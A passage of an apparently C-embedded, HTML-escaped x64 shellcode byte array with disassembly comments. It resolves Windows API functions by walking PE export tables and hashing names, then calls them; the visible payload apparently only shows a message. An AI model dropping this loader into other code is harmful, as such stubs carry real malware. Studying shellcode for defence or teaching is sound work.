   /* 0106 */ &quot;\\xc6\\x44\\x24\\x4b\\x21&quot;                             /* mov byte [rsp+0x4b], 0x21                */\n    /* 010B */ &quot;\\xc6\\x44\\x24\\x4c\\x00&quot;                             /* mov byte [rsp+0x4c], 0x0                 */\n    /* 0110 */ &quot;\\xe8\\x3b\\x05\\x00\\x00&quot;                             /* call 0x650                               */\n    /* 0115 */ &quot;\\x48\\x89\\x84\\x24\\x88\\x00\\x00\\x00&quot;                 /* mov [rsp+0x88], rax                      */\n    /* 011D */ &quot;\\x48\\x83\\xbc\\x24\\x88\\x00\\x00\\x00\\xff&quot;             /* cmp qword [rsp+0x88], 0xffffffffffffffff */\n    /* 0126 */ &quot;\\x75\\x05&quot;                                         /* jnz 0x12d                                */\n    /* 0128 */ &quot;\\xe9\\xd9\\x01\\x00\\x00&quot;                             /* jmp 0x306                                */\n    /* 012D */ &quot;\\x48\\x8b\\x84\\x24\\x88\\x00\\x00\\x00&quot;                 /* mov rax, [rsp+0x88]                      */\n    /* 0135 */ &quot;\\x48\\x89\\x44\\x24\\x28&quot;                             /* mov [rsp+0x28], rax                      */\n    /* 013A */ &quot;\\x48\\x8b\\x44\\x24\\x28&quot;                             /* mov rax, [rsp+0x28]                      */\n    /* 013F */ &quot;\\x48\\x89\\x84\\x24\\xb0\\x00\\x00\\x00&quot;                 /* mov [rsp+0xb0], rax                      */\n    /* 0147 */ &quot;\\x48\\x8b\\x84\\x24\\xb0\\x00\\x00\\x00&quot;                 /* mov rax, [rsp+0xb0]                      */\n    /* 014F */ &quot;\\x48\\x63\\x40\\x3c&quot;                                 /* movsxd rax, dword [rax+0x3c]             */\n    /* 0153 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 0158 */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 015B */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 015E */ &quot;\\x48\\x89\\x84\\x24\\xb8\\x00\\x00\\x00&quot;                 /* mov [rsp+0xb8], rax                      */\n    /* 0166 */ &quot;\\xb8\\x08\\x00\\x00\\x00&quot;                             /* mov eax, 0x8                             */\n    /* 016B */ &quot;\\x48\\x6b\\xc0\\x00&quot;                                 /* imul rax, rax, 0x0                       */\n    /* 016F */ &quot;\\x48\\x8b\\x8c\\x24\\xb8\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0xb8]                      */\n    /* 0177 */ &quot;\\x8b\\x84\\x01\\x88\\x00\\x00\\x00&quot;                     /* mov eax, [rcx+rax+0x88]                  */\n    /* 017E */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 0183 */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 0186 */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 0189 */ &quot;\\x48\\x89\\x44\\x24\\x50&quot;                             /* mov [rsp+0x50], rax                      */\n    /* 018E */ &quot;\\x48\\x8b\\x44\\x24\\x50&quot;                             /* mov rax, [rsp+0x50]                      */\n    /* 0193 */ &quot;\\x8b\\x40\\x20&quot;                                     /* mov eax, [rax+0x20]                      */\n    /* 0196 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 019B */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 019E */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 01A1 */ &quot;\\x48\\x89\\x84\\x24\\xc0\\x00\\x00\\x00&quot;                 /* mov [rsp+0xc0], rax                      */\n    /* 01A9 */ &quot;\\x48\\x8b\\x44\\x24\\x50&quot;                             /* mov rax, [rsp+0x50]                      */\n    /* 01AE */ &quot;\\x8b\\x40\\x1c&quot;                                     /* mov eax, [rax+0x1c]                      */\n    /* 01B1 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 01B6 */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 01B9 */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 01BC */ &quot;\\x48\\x89\\x84\\x24\\xa0\\x00\\x00\\x00&quot;                 /* mov [rsp+0xa0], rax                      */\n    /* 01C4 */ &quot;\\x48\\x8b\\x44\\x24\\x50&quot;                             /* mov rax, [rsp+0x50]                      */\n    /* 01C9 */ &quot;\\x8b\\x40\\x24&quot;                                     /* mov eax, [rax+0x24]                      */\n    /* 01CC */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 01D1 */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 01D4 */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 01D7 */ &quot;\\x48\\x89\\x84\\x24\\x98\\x00\\x00\\x00&quot;                 /* mov [rsp+0x98], rax                      */\n    /* 01DF */ &quot;\\xc7\\x44\\x24\\x74\\x88\\xef\\xff\\x6f&quot;                 /* mov dword [rsp+0x74], 0x6fffef88         */\n    /* 01E7 */ &quot;\\xc7\\x44\\x24\\x70\\x7e\\xaa\\x8a\\x3f&quot;                 /* mov dword [rsp+0x70], 0x3f8aaa7e         */\n    /* 01EF */ &quot;\\xc7\\x44\\x24\\x20\\x00\\x00\\x00\\x00&quot;                 /* mov dword [rsp+0x20], 0x0                */\n    /* 01F7 */ &quot;\\xeb\\x0a&quot;                                         /* jmp 0x203                                */\n    /* 01F9 */ &quot;\\x8b\\x44\\x24\\x20&quot;                                 /* mov eax, [rsp+0x20]                      */\n    /* 01FD */ &quot;\\xff\\xc0&quot;                                         /* inc eax                                  */\n    /* 01FF */ &quot;\\x89\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], eax                      */\n    /* 0203 */ &quot;\\x48\\x8b\\x44\\x24\\x50&quot;                             /* mov rax, [rsp+0x50]                      */\n    /* 0208 */ &quot;\\x8b\\x40\\x18&quot;                                     /* mov eax, [rax+0x18]                      */\n    /* 020B */ &quot;\\x39\\x44\\x24\\x20&quot;                                 /* cmp [rsp+0x20], eax                      */\n    /* 020F */ &quot;\\x0f\\x83\\xf1\\x00\\x00\\x00&quot;                         /* jae 0x306                                */\n    /* 0215 */ &quot;\\x8b\\x44\\x24\\x20&quot;                                 /* mov eax, [rsp+0x20]                      */\n    /* 0219 */ &quot;\\x48\\x8b\\x8c\\x24\\xc0\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0xc0]                      */\n    /* 0221 */ &quot;\\x8b\\x04\\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */\n    /* 0224 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 0229 */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 022C */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 022F */ &quot;\\x48\\x89\\x84\\x24\\x90\\x00\\x00\\x00&quot;                 /* mov [rsp+0x90], rax                      */\n    /* 0237 */ &quot;\\x48\\x8b\\x8c\\x24\\x90\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0x90]                      */\n    /* 023F */ &quot;\\xe8\\xac\\x03\\x00\\x00&quot;                             /* call 0x5f0                               */\n    /* 0244 */ &quot;\\x3b\\x44\\x24\\x70&quot;                                 /* cmp eax, [rsp+0x70]                      */\n    /* 0248 */ &quot;\\x75\\x30&quot;                                         /* jnz 0x27a                                */\n    /* 024A */ &quot;\\x8b\\x44\\x24\\x20&quot;                                 /* mov eax, [rsp+0x20]                      */\n    /* 024E */ &quot;\\x48\\x8b\\x8c\\x24\\x98\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0x98]                      */\n    /* 0256 */ &quot;\\x0f\\xb7\\x04\\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */\n    /* 025A */ &quot;\\x48\\x8b\\x8c\\x24\\xa0\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0xa0]                      */\n    /* 0262 */ &quot;\\x8b\\x04\\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */\n    /* 0265 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 026A */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 026D */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 0270 */ &quot;\\x48\\x89\\x84\\x24\\x80\\x00\\x00\\x00&quot;                 /* mov [rsp+0x80], rax                      */\n    /* 0278 */ &quot;\\xeb\\x3e&quot;                                         /* jmp 0x2b8                                */\n    /* 027A */ &quot;\\x48\\x8b\\x8c\\x24\\x90\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0x90]                      */\n    /* 0282 */ &quot;\\xe8\\x69\\x03\\x00\\x00&quot;                             /* call 0x5f0                               */\n    /* 0287 */ &quot;\\x3b\\x44\\x24\\x74&quot;                                 /* cmp eax, [rsp+0x74]                      */\n    /* 028B */ &quot;\\x75\\x2b&quot;                                         /* jnz 0x2b8                                */\n    /* 028D */ &quot;\\x8b\\x44\\x24\\x20&quot;                                 /* mov eax, [rsp+0x20]                      */\n    /* 0291 */ &quot;\\x48\\x8b\\x8c\\x24\\x98\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0x98]                      */\n    /* 0299 */ &quot;\\x0f\\xb7\\x04\\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */\n    /* 029D */ &quot;\\x48\\x8b\\x8c\\x24\\xa0\\x00\\x00\\x00&quot;                 /* mov rcx, [rsp+0xa0]                      */\n    /* 02A5 */ &quot;\\x8b\\x04\\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */\n    /* 02A8 */ &quot;\\x48\\x8b\\x4c\\x24\\x28&quot;                             /* mov rcx, [rsp+0x28]                      */\n    /* 02AD */ &quot;\\x48\\x03\\xc8&quot;                                     /* add rcx, rax                             */\n    /* 02B0 */ &quot;\\x48\\x8b\\xc1&quot;                                     /* mov rax, rcx                             */\n    /* 02B3 */ &quot;\\x48\\x89\\x44\\x24\\x78&quot;                             /* mov [rsp+0x78], rax                      */\n    /* 02B8 */ &quot;\\x48\\x83\\xbc\\x24\\x80\\x00\\x00\\x00\\x00&quot;             /* cmp qword [rsp+0x80], 0x0                */\n    /* 02C1 */ &quot;\\x74\\x3e&quot;                                         /* jz 0x301                                 */\n    /* 02C3 */ &quot;\\x48\\x83\\x7c\\x24\\x78\\x00&quot;                         /* cmp qword [rsp+0x78], 0x0                */\n    /* 02C9 */ &quot;\\x74\\x36&quot;                                         /* jz 0x301                                 */\n    /* 02CB */ &quot;\\x48\\x8d\\x4c\\x24\\x58&quot;                             /* lea rcx, [rsp+0x58]                      */\n    /* 02D0 */ &quot;\\xff\\x54\\x24\\x78&quot;                                 /* call qword [rsp+0x78]                    */\n    /* 02D4 */ &quot;\\x48\\x8d\\x54\\x24\\x30&quot;                             /* lea rdx, [rsp+0x30]                      */\n    /* 02D9 */ &quot;\\x48\\x8b\\xc8&quot;                                     /* mov rcx, rax                             */\n    /* 02DC */ &quot;\\xff\\x94\\x24\\x80\\x00\\x00\\x00&quot;                     /* call qword [rsp+0x80]                    */\n    /* 02E3 */ &quot;\\x48\\x89\\x84\\x24\\xa8\\x00\\x00\\x00&quot;                 /* mov [rsp+0xa8], rax                      */\n    /* 02EB */ &quot;\\x45\\x33\\xc9&quot;                                     /* xor r9d, r9d                             */\n    /* 02EE */ &quot;\\x45\\x33\\xc0&quot;                                     /* xor r8d, r8d                             */\n    /* 02F1 */ &quot;\\x48\\x8d\\x54\\x24\\x40&quot;                             /* lea rdx, [rsp+0x40]                      */\n    /* 02F6 */ &quot;\\x33\\xc9&quot;                                         /* xor ecx, ecx                             */\n    /* 02F8 */ &quot;\\xff\\x94\\x24\\xa8\\x00\\x00\\x00&quot;                     /* call qword [rsp+0xa8]                    */\n    /* 02FF */ &quot;\\xeb\\x05&quot;                                         /* jmp 0x306                                */\n    /* 0301 */ &quot;\\xe9\\xf3\\xfe\\xff\\xff&quot;                             /* jmp 0x1f9                                */\n    /* 0306 */ &quot;\\x48\\x81\\xc4\\xd8\\x00\\x00\\x00&quot;                     /* add rsp, 0xd8                            */\n    /* 030D */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 030E */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 030F */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0310 */ &quot;\\x88\\x4c\\x24\\x08&quot;                                 /* mov [rsp+0x8], cl                        */\n    /* 0314 */ &quot;\\x48\\x83\\xec\\x18&quot;                                 /* sub rsp, 0x18                            */\n    /* 0318 */ &quot;\\x0f\\xbe\\x44\\x24\\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */\n    /* 031D */ &quot;\\x83\\xf8\\x41&quot;                                     /* cmp eax, 0x41                            */\n    /* 0320 */ &quot;\\x7c\\x13&quot;                                         /* jl 0x335                                 */\n    /* 0322 */ &quot;\\x0f\\xbe\\x44\\x24\\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */\n    /* 0327 */ &quot;\\x83\\xf8\\x5a&quot;                                     /* cmp eax, 0x5a                            */\n    /* 032A */ &quot;\\x7f\\x09&quot;                                         /* jg 0x335                                 */\n    /* 032C */ &quot;\\xc7\\x04\\x24\\x01\\x00\\x00\\x00&quot;                     /* mov dword [rsp], 0x1                     */\n    /* 0333 */ &quot;\\xeb\\x07&quot;                                         /* jmp 0x33c                                */\n    /* 0335 */ &quot;\\xc7\\x04\\x24\\x00\\x00\\x00\\x00&quot;                     /* mov dword [rsp], 0x0                     */\n    /* 033C */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 033F */ &quot;\\x48\\x83\\xc4\\x18&quot;                                 /* add rsp, 0x18                            */\n    /* 0343 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 0344 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0345 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0346 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0347 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0348 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0349 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034A */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034B */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034C */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034D */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034E */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 034F */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0350 */ &quot;\\x88\\x4c\\x24\\x08&quot;                                 /* mov [rsp+0x8], cl                        */\n    /* 0354 */ &quot;\\x48\\x83\\xec\\x38&quot;                                 /* sub rsp, 0x38                            */\n    /* 0358 */ &quot;\\x0f\\xb6\\x4c\\x24\\x40&quot;                             /* movzx ecx, byte [rsp+0x40]               */\n    /* 035D */ &quot;\\xe8\\xae\\xff\\xff\\xff&quot;                             /* call 0x310                               */\n    /* 0362 */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0364 */ &quot;\\x74\\x0e&quot;                                         /* jz 0x374                                 */\n    /* 0366 */ &quot;\\x0f\\xbe\\x44\\x24\\x40&quot;                             /* movsx eax, byte [rsp+0x40]               */\n    /* 036B */ &quot;\\x83\\xc0\\x20&quot;                                     /* add eax, 0x20                            */\n    /* 036E */ &quot;\\x89\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], eax                      */\n    /* 0372 */ &quot;\\xeb\\x09&quot;                                         /* jmp 0x37d                                */\n    /* 0374 */ &quot;\\x0f\\xbe\\x44\\x24\\x40&quot;                             /* movsx eax, byte [rsp+0x40]               */\n    /* 0379 */ &quot;\\x89\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], eax                      */\n    /* 037D */ &quot;\\x0f\\xb6\\x44\\x24\\x20&quot;                             /* movzx eax, byte [rsp+0x20]               */\n    /* 0382 */ &quot;\\x48\\x83\\xc4\\x38&quot;                                 /* add rsp, 0x38                            */\n    /* 0386 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 0387 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0388 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0389 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038A */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038B */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038C */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038D */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038E */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 038F */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 0390 */ &quot;\\x48\\x89\\x4c\\x24\\x08&quot;                             /* mov [rsp+0x8], rcx                       */\n    /* 0395 */ &quot;\\x48\\x83\\xec\\x18&quot;                                 /* sub rsp, 0x18                            */\n    /* 0399 */ &quot;\\xc7\\x04\\x24\\x00\\x00\\x00\\x00&quot;                     /* mov dword [rsp], 0x0                     */\n    /* 03A0 */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 03A3 */ &quot;\\x48\\x8b\\x4c\\x24\\x20&quot;                             /* mov rcx, [rsp+0x20]                      */\n    /* 03A8 */ &quot;\\x0f\\xb7\\x04\\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */\n    /* 03AC */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 03AE */ &quot;\\x74\\x0a&quot;                                         /* jz 0x3ba                                 */\n    /* 03B0 */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 03B3 */ &quot;\\xff\\xc0&quot;                                         /* inc eax                                  */\n    /* 03B5 */ &quot;\\x89\\x04\\x24&quot;                                     /* mov [rsp], eax                           */\n    /* 03B8 */ &quot;\\xeb\\xe6&quot;                                         /* jmp 0x3a0                                */\n    /* 03BA */ &quot;\\x8b\\x04\\x24&quot;                                     /* mov eax, [rsp]                           */\n    /* 03BD */ &quot;\\x48\\x83\\xc4\\x18&quot;                                 /* add rsp, 0x18                            */\n    /* 03C1 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 03C2 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C3 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C4 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C5 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C6 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C7 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C8 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03C9 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CA */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CB */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CC */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CD */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CE */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03CF */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 03D0 */ &quot;\\x48\\x89\\x54\\x24\\x10&quot;                             /* mov [rsp+0x10], rdx                      */\n    /* 03D5 */ &quot;\\x48\\x89\\x4c\\x24\\x08&quot;                             /* mov [rsp+0x8], rcx                       */\n    /* 03DA */ &quot;\\x48\\x83\\xec\\x38&quot;                                 /* sub rsp, 0x38                            */\n    /* 03DE */ &quot;\\xb8\\x01\\x00\\x00\\x00&quot;                             /* mov eax, 0x1                             */\n    /* 03E3 */ &quot;\\x48\\x6b\\xc0\\x00&quot;                                 /* imul rax, rax, 0x0                       */\n    /* 03E7 */ &quot;\\x48\\x8b\\x4c\\x24\\x48&quot;                             /* mov rcx, [rsp+0x48]                      */\n    /* 03EC */ &quot;\\x0f\\xb6\\x04\\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */\n    /* 03F0 */ &quot;\\x88\\x44\\x24\\x22&quot;                                 /* mov [rsp+0x22], al                       */\n    /* 03F4 */ &quot;\\x0f\\xb6\\x4c\\x24\\x22&quot;                             /* movzx ecx, byte [rsp+0x22]               */\n    /* 03F9 */ &quot;\\xe8\\x52\\xff\\xff\\xff&quot;                             /* call 0x350                               */\n    /* 03FE */ &quot;\\x88\\x44\\x24\\x21&quot;                                 /* mov [rsp+0x21], al                       */\n    /* 0402 */ &quot;\\x48\\x8b\\x44\\x24\\x48&quot;                             /* mov rax, [rsp+0x48]                      */\n    /* 0407 */ &quot;\\x48\\x83\\xc0\\x02&quot;                                 /* add rax, 0x2                             */\n    /* 040B */ &quot;\\x48\\x89\\x44\\x24\\x48&quot;                             /* mov [rsp+0x48], rax                      */\n    /* 0410 */ &quot;\\x0f\\xbe\\x44\\x24\\x21&quot;                             /* movsx eax, byte [rsp+0x21]               */\n    /* 0415 */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0417 */ &quot;\\x75\\x07&quot;                                         /* jnz 0x420                                */\n    /* 0419 */ &quot;\\x48\\x8b\\x44\\x24\\x40&quot;                             /* mov rax, [rsp+0x40]                      */\n    /* 041E */ &quot;\\xeb\\x7c&quot;                                         /* jmp 0x49c                                */\n    /* 0420 */ &quot;\\x48\\x8b\\x4c\\x24\\x48&quot;                             /* mov rcx, [rsp+0x48]                      */\n    /* 0425 */ &quot;\\xe8\\x66\\xff\\xff\\xff&quot;                             /* call 0x390                               */\n    /* 042A */ &quot;\\x89\\x44\\x24\\x24&quot;                                 /* mov [rsp+0x24], eax                      */\n    /* 042E */ &quot;\\xb8\\x01\\x00\\x00\\x00&quot;                             /* mov eax, 0x1                             */\n    /* 0433 */ &quot;\\x48\\x6b\\xc0\\x00&quot;                                 /* imul rax, rax, 0x0                       */\n    /* 0437 */ &quot;\\x48\\x8b\\x4c\\x24\\x40&quot;                             /* mov rcx, [rsp+0x40]                      */\n    /* 043C */ &quot;\\x0f\\xb6\\x04\\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */\n    /* 0440 */ &quot;\\x88\\x44\\x24\\x23&quot;                                 /* mov [rsp+0x23], al                       */\n    /* 0444 */ &quot;\\x0f\\xb6\\x4c\\x24\\x23&quot;                             /* movzx ecx, byte [rsp+0x23]               */\n    /* 0449 */ &quot;\\xe8\\x02\\xff\\xff\\xff&quot;                             /* call 0x350                               */\n    /* 044E */ &quot;\\x88\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], al                       */\n    /* 0452 */ &quot;\\x48\\x8b\\x44\\x24\\x40&quot;                             /* mov rax, [rsp+0x40]                      */\n    /* 0457 */ &quot;\\x48\\x83\\xc0\\x02&quot;                                 /* add rax, 0x2                             */\n    /* 045B */ &quot;\\x48\\x89\\x44\\x24\\x40&quot;                             /* mov [rsp+0x40], rax                      */\n    /* 0460 */ &quot;\\x0f\\xbe\\x44\\x24\\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */\n    /* 0465 */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0467 */ &quot;\\x75\\x04&quot;                                         /* jnz 0x46d                                */\n    /* 0469 */ &quot;\\x33\\xc0&quot;                                         /* xor eax, eax                             */\n    /* 046B */ &quot;\\xeb\\x2f&quot;                                         /* jmp 0x49c                                */\n    /* 046D */ &quot;\\x0f\\xbe\\x44\\x24\\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */\n    /* 0472 */ &quot;\\x0f\\xbe\\x4c\\x24\\x21&quot;                             /* movsx ecx, byte [rsp+0x21]               */\n    /* 0477 */ &quot;\\x3b\\xc1&quot;                                         /* cmp eax, ecx                             */\n    /* 0479 */ &quot;\\x75\\xb3&quot;                                         /* jnz 0x42e                                */\n    /* 047B */ &quot;\\x44\\x8b\\x44\\x24\\x24&quot;                             /* mov r8d, [rsp+0x24]                      */\n    /* 0480 */ &quot;\\x48\\x8b\\x54\\x24\\x48&quot;                             /* mov rdx, [rsp+0x48]                      */\n    /* 0485 */ &quot;\\x48\\x8b\\x4c\\x24\\x40&quot;                             /* mov rcx, [rsp+0x40]                      */\n    /* 048A */ &quot;\\xe8\\x21\\x00\\x00\\x00&quot;                             /* call 0x4b0                               */\n    /* 048F */ &quot;\\x85\\xc0&quot;                                         /* test eax, eax                            */\n    /* 0491 */ &quot;\\x75\\x9b&quot;                                         /* jnz 0x42e                                */\n    /* 0493 */ &quot;\\x48\\x8b\\x44\\x24\\x40&quot;                             /* mov rax, [rsp+0x40]                      */\n    /* 0498 */ &quot;\\x48\\x83\\xe8\\x02&quot;                                 /* sub rax, 0x2                             */\n    /* 049C */ &quot;\\x48\\x83\\xc4\\x38&quot;                                 /* add rsp, 0x38                            */\n    /* 04A0 */ &quot;\\xc3&quot;                                             /* ret                                      */\n    /* 04A1 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A2 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A3 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A4 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A5 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A6 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A7 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A8 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04A9 */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AA */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AB */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AC */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AD */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AE */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04AF */ &quot;\\xcc&quot;                                             /* int3                                     */\n    /* 04B0 */ &quot;\\x44\\x89\\x44\\x24\\x18&quot;                             /* mov [rsp+0x18], r8d                      */\n    /* 04B5 */ &quot;\\x48\\x89\\x54\\x24\\x10&quot;                             /* mov [rsp+0x10], rdx                      */\n    /* 04BA */ &quot;\\x48\\x89\\x4c\\x24\\x08&quot;                             /* mov [rsp+0x8], rcx                       */\n    /* 04BF */ &quot;\\x48\\x83\\xec\\x38&quot;                                 /* sub rsp, 0x38                            */\n    /* 04C3 */ &quot;\\x8b\\x44\\x24\\x50&quot;                                 /* mov eax, [rsp+0x50]                      */\n    /* 04C7 */ &quot;\\xff\\xc8&quot;                                         /* dec eax                                  */\n    /* 04C9 */ &quot;\\x89\\x44\\x24\\x50&quot;                                 /* mov [rsp+0x50], eax                      */\n    /* 04CD */ &quot;\\xb8\\x01\\x00\\x00\\x00&quot;                             /* mov eax, 0x1                             */\n    /* 04D2 */ &quot;\\x48\\x6b\\xc0\\x00&quot;                                 /* imul rax, rax, 0x0                       */\n    /* 04D6 */ &quot;\\x48\\x8b\\x4c\\x24\\x40&quot;                             /* mov rcx, [rsp+0x40]                      */\n    /* 04DB */ &quot;\\x0f\\xb6\\x04\\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */\n    /* 04DF */ &quot;\\x88\\x44\\x24\\x20&quot;                                 /* mov [rsp+0x20], al                       */\n    /* 04E3 */ &quot;\\x48\\x8b\\x44\\x24\\x40&quot;                             /* mov rax, [rsp+0x40]                      */\n    /* 04E8 */ &quot;\\x48\\x83\\xc0\\x02&quot;                                 /* add rax, 0x2                             */\n    /* 04EC */ &quot;\\x48\\x89\\x44\\x24\\x40&quot;                             /* mov [rsp+0x40], rax                      */\n    /* 04F1 */ &quot;\\xb8\\x01\\x00\\x00\\x00&quot;                             /* mov eax, 0x1                             */\n    /* 04F6 */ &quot;\\x48\\x6b\\xc0\\x00&quot;                                 /* imul rax, rax, 0x0                       */\n    /* 04FA */ &quot;\\x48\\x8b\\x4c\\x24\\x48&quot;                             /* mov rcx, [rsp+0x48]                      */\n    /* 04FF */ &quot;\\x0f\\xb6\\x04\\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */\n    /* 0503 */ &quot;\\x88\\x44\\x24\\x21&quot;                                 /* mov [rsp+0x21], al                       */\n    /* 0507 */ &quot;\\x48\\x8b\\x44\\x24\\x48&quot;                             /* mov rax, [rsp+0x48]                      */\n    /* 050C */ &quot;\\x48\\x83\\xc0\\x02&quot;                                 /* add rax, 0x2                             */\n    /* 0510 */ &quot;\\x48\\x89\\x44\\x24\\x48&quot;                             /* mov [rsp+0x48], rax                      */\n    /* 0515 */ &quot;\\x0f\\xb6\\x4c\\x24\\x20&quot;                             /* movzx ecx, byte [rsp+0x20]               */\n    /* 051A */ &quot;\\xe8\\x31\\xfe\\xff\\xff&quot;                             /* call 0x350                               */\n    /* 051F */ &quot;\\x0f\\xbe\\xc0&quot;                                     /* movsx eax, al                            */\n    /* 0522 */ &quot;\\x89\\x44\\x24\\x28&quot;                                 /* mov [rsp+0x28], eax                      */\n    /* 0526 */ &quot;\\x0f\\xb6\\x4c\\x24\\x21&quot;                             /* movzx ecx, byte [rsp+0x21]               */\n    /* 052B */ &quot;\\xe8\\x20\\xfe\\xff\\xff&quot;                             /* 